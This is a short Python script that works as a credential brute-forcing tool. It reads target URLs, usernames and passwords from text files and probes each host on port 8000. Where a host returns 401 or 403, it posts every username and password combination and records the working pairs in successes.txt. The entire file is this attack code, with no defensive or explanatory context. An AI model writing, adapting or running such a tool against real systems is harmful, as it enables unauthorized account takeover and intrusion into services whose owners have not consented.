import requests
ur = open("urls.txt", 'r')
urls = ur.read().strip().split()
ur.close()
us = open("usernames.txt", 'r')
usernames = us.read().strip().split()
us.close()
p = open("passwords.txt", 'r')
passwords = p.read().strip().split()
values = {}
succ = open("successes.txt", 'wt')
for url in urls:
    res = requests.get(url + ':8000')
    print(url, res.status_code)
    if (res.status_code == 401) or(res.status_code == 403):
        for username in usernames:
            values['username'] = username
            for password in passwords:
                values['password'] = password
                r = requests.post(url, data=values)
                if  r.status_code == 201 or r.status_code == 202:
                    succ.write(url + ' ' + username + ' ' + password + ' ' + str(r.status_code) + '\n')
